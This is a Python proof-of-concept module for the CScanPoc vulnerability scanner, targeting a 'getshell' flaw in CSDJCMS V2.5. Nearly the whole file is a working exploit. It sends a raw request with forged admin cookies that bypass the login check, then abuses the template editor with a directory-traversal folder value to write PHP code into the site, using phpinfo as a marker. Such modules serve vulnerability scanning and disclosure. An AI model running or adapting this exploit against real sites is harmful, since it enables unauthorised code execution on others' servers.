# coding: utf-8

from CScanPoc.thirdparty import requests, hackhttp
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
import urllib.parse


class Vuln(ABVuln):
    vuln_id = 'CSDJCMS_0001'  # 平台漏洞编号
    name = 'CSDJCMS(程氏舞曲管理系统) V2.5 getshell'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.RCE  # 漏洞类型
    disclosure_date = '2013-04-11'  # 漏洞公布时间
    desc = '''
        CSDJCMS(程氏舞曲管理系统) V2.5 admin_loginstate.php文件中，如果s_login 的值等于 四个cookie 相加的md5加密，即可直接通过验证。
    '''  # 漏洞描述
    ref = 'http://www.it165.net/safe/html/201304/509.html'  # 漏洞来源
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = 'CSDJCMS(程氏舞曲管理系统)'  # 漏洞应用名称
    product_version = 'CSDJCMS(程氏舞曲管理系统) V2.5'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = '1d8c9a29-1986-4bc9-873d-b1fea9a7b87d'
    author = '47bwy'  # POC编写者
    create_date = '2018-06-12'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }

    def verify(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))

            hh = hackhttp.hackhttp()
            url = self.target
            o = urllib.parse.urlparse(url)
            raw = """
Host: {host}
User-Agent: Mozilla/5.0 (Windows NT 5.1; rv:19.0) Gecko/20100101 Firefox/19.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-cn,zh;q=0.8,en-us;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
Referer: {url}/admin/admin_t ... ;file=artindex.html
Cookie: S_Permission=1,2,3,4,5,6,7,8,9,10,11,12,13,14,15; S_Login=d8d998f3eb371c2009acd8580c1821d0; S_AdminUserName=1; S_AdminPassWord=1; S_AdminID=1; CNZZDATA4170884=cnzz_eid%3D1098390420-1364934762-http%253A%252F%252Fwww.hshxs.com%26ntime%3D1364935608%26cnzz_a%3D19%26retime%3D1365111972892%26sin%3Dnone%26ltime%3D1365111972892%26rtime%3D0; bdshare_firstime=1365107576347; PHPSESSID=u6kd9d6f18fhfr9bi4if6agcj6
Connection: keep-alive
Content-Type: application/x-www-form-urlencoded
Content-Length: 169

FileName=cs-bottom.php&content=%3C%3Fphp+phpinfo+%3F%3E&folder=..%2Fskins%2Findex%2Fhtml%2F&tempname=%C4%AC%C8%CF%C4%A3%B0%E6&Submit=%D0%DE%B8%C4%B5%B1%C7%B0%C4%A3%B0%E5

            """.format(host=o.hostname, url=url)
            code, head, res, errcode, _ = hh.http(url, raw=raw)

            if 'PHP Version' in res and 'System' in res:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))

        except Exception as e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
